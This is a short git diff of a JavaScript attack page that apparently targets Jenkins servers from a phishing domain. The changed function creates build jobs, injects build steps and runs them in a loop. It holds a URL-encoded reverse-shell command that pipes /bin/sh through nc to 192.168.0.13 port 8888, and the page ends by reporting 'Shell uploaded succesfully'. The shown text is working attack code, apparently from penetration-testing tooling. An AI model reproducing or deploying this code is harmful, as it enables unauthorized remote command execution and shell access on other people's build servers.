@@ -54,14 +54,15 @@ So if you want to host script on some phishy domain, it will work only on jenkin
           xhttp.send(data);
         }
         function sendPayload(name, payload, host){
+          name_r = Math.floor((Math.random() * 1000) + 1);
           var shell = "mknod+%2Ftmp%2Fbackpipe+p+%26%26+%2Fbin%2Fsh+0%3C%2Ftmp%2Fbackpipe+%7C+nc+192.168.0.13+8888+1%3E%2Ftmp%2Fbackpipe"
           var Payload = "echo%20%2712312%27%20%7C%20write%20pentest%20pts%2F0";
-          createJob(name, host);
-          addBuildStep(name, Payload, host);
+          for(i=0; i< 10; i++){
+            createJob(name, host);
+            addBuildStep(name, Payload, host);
           //executors = getExecutors(host)
           //alert(executors)
-          for(i=0; i< 10; i++){
-            setTimeout(rubBuild(name,host), 1000);
+            rubBuild(name,host);
           }
           document.getElementById("result").innerHTML = "Shell uploaded succesfully";
         }
